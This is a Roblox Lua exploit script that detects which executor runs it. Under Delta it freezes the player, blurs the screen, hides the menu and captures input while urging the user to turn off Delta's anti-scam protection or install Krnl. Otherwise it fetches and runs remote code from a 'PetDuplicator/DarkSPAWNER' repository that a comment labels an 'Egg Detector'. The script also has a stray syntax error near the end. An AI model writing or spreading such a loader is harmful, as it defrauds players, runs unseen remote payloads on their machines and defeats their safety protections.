local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local playerGui = player:WaitForChild("PlayerGui")

-- Function to detect executor (based on original user-provided logic)
local function getExecutorName()
    if identifyexecutor then
        return identifyexecutor()
    elseif getexecutorname then
        return getexecutorname()
    elseif isdelta then
        return "Delta"
    elseif iskrnlclosure then
        return "Krnl"
    elseif syn then
        return "Synapse X"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif pebc_execute then
        return "ProtoSmasher"
    elseif isfluxus then
        return "Fluxus"
    else
        return "Unknown"
    end
end

local executor = getExecutorName()
warn("Executor Detected:", executor) -- Output to Roblox console

-- If executor is Delta, activate the freeze screen
if executor:lower():find("delta") then
    -- Wait for character to load
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- 🌀 Blur screen (similar to HTML background blur)
    local blur = Instance.new("BlurEffect")
    blur.Name = "DeltaFreezeBlur"
    blur.Size = 25 -- Adjust blur intensity as needed
    blur.Parent = Lighting

    -- 🧊 Freeze player
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.AutoRotate = false
    rootPart.Anchored = true

    -- 🎥 Lock camera
    -- Ensure the camera exists and is ready
    if not camera then
        camera = workspace:WaitForChild("CurrentCamera")
    end
    camera.CameraType = Enum.CameraType.Scriptable
    -- Position camera relative to the player's root part
    camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)

    -- Create UI (mimicking the HTML modal's appearance)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaDetectionUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false -- Keep UI after player respawns
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 200) -- Fixed size like in HTML
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 36) -- Dark gray/black from green.png
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 10) -- Rounded corners
    uiCorner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Text = "⚠️ Executor Not Supported" -- Updated text from green.png
    title.Font = Enum.Font.GothamBold -- Using GothamBold for emphasis
    title.TextSize = 20 -- Slightly larger
    title.TextColor3 = Color3.fromRGB(0, 255, 0) -- Bright green from green.png
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, -40, 0, 30)
    title.Position = UDim2.new(0, 20, 0, 10)
    title.TextWrapped = true
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.TextYAlignment = Enum.TextYAlignment.Center
    title.Parent = mainFrame

    local messageText = Instance.new("TextLabel")
    -- Removed "Closing in 59 seconds..." from the text
    messageText.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor."
    messageText.Font = Enum.Font.Gotham
    messageText.TextSize = 12
    messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White from green.png
    messageText.BackgroundTransparency = 1
    messageText.Size = UDim2.new(1, -40, 0, 100)
    messageText.Position = UDim2.new(0, 20, 0, 40)
    messageText.TextWrapped = true
    messageText.TextXAlignment = Enum.TextXAlignment.Center
    messageText.TextYAlignment = Enum.TextYAlignment.Top
    messageText.Parent = mainFrame

    -- Copy Button
    local copyButton = Instance.new("TextButton")
    copyButton.Size = UDim2.new(0, 200, 0, 36)
    copyButton.Position = UDim2.new(0.5, -100, 1, -50)
    copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green from green.png
    copyButton.Text = "Copy Krnl Link"
    copyButton.Font = Enum.Font.GothamBold -- Using GothamBold for button
    copyButton.TextSize = 16
    copyButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text for contrast
    copyButton.AutoButtonColor = true
    copyButton.Parent = mainFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = copyButton

    -- Copy functionality (using setclipboard for Roblox)
    copyButton.MouseButton1Click:Connect(function()
        pcall(function()
            setclipboard("https://krnl.cat/downloads/")
            copyButton.Text = "Copied!"
            task.wait(1)
            copyButton.Text = "Copy Krnl Link"
        end)
    end)

    -- 🔧 Hide TopBar (ESC/menu)
    pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
    end)

    -- ⛔ Block input backup
    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
            input:CaptureController()
        end
    end)
else
    -- ✅ Not Delta → continue loading Egg Detector script (from original user-provided logic)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
    end)
end
